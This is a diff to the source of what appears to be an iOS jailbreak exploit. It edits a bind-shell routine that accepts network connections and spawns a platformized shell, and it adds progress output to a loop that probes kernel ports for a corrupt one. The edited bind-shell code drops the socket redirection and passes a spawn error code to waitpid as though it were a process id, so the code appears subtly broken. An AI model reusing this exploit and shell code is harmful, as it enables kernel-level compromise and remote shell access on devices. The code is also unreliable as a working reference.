@@ -39,7 +39,7 @@ uint64_t kernel_base = 0;
 #define REFILL_PORTS_COUNT 100
 #define TOOLAZY_PORTS_COUNT 1000
 #define REFILL_USERCLIENTS_COUNT 1000
-#define MAX_PEEKS 60000
+#define MAX_PEEKS 30000
 char* bundle_path() {
     CFBundleRef mainBundle = CFBundleGetMainBundle();
     CFURLRef resourcesURL = CFBundleCopyResourcesDirectoryURL(mainBundle);
@@ -150,29 +150,12 @@ void do_bind_shell(char* env, int port) {
     for(;;) {
         int conn = accept(sock, 0, 0);
         
-        posix_spawn_file_actions_t actions;
         
-        posix_spawn_file_actions_init(&actions);
-        posix_spawn_file_actions_adddup2(&actions, conn, 0);
-        posix_spawn_file_actions_adddup2(&actions, conn, 1);
-        posix_spawn_file_actions_adddup2(&actions, conn, 2);
-        
-        
-        pid_t spawned_pid = 0;
         int spawn_err = spawnAndPlatformize(shell_path, argv[0], NULL, NULL, NULL, NULL);
-        if (spawn_err != 0){
-            perror("shell spawn error");
-        } else {
-            printf("shell posix_spawn success!\n");
-        }
-        
-        posix_spawn_file_actions_destroy(&actions);
-        
-        printf("our pid: %d\n", getpid());
-        printf("spawned_pid: %d\n", spawned_pid);
+        printf("shell spawn: %d\n", spawn_err);
         
         int wl = 0;
-        while (waitpid(spawned_pid, &wl, 0) == -1 && errno == EINTR);
+        while (waitpid(spawn_err, &wl, 0) == -1 && errno == EINTR);
     }
     
     free(shell_path);
@@ -378,14 +361,23 @@ void jb_go(void)
                 found = 1;
                 break;
             }
+            usleep(1); //better
+        }
+        if(peeks == (MAX_PEEKS / 4) && peeks < (MAX_PEEKS /2)) {
+            printf("25%% of the ports checked...\n");
+        }
+        
+        if(peeks == (MAX_PEEKS / 2)) {
+            printf("50%% of the ports checked, are you sure we are gonna make it? ...\n");
         }
         
         if (found)
             break;
     }
     
+    
     if (peeks >= MAX_PEEKS) {
-        printf("Didn't find corrupt port\n");
+        printf("Did not find corrupt port\n");
         sleep(1);
         //panic_now(); //Uncomment if you want panics
         exit(0);
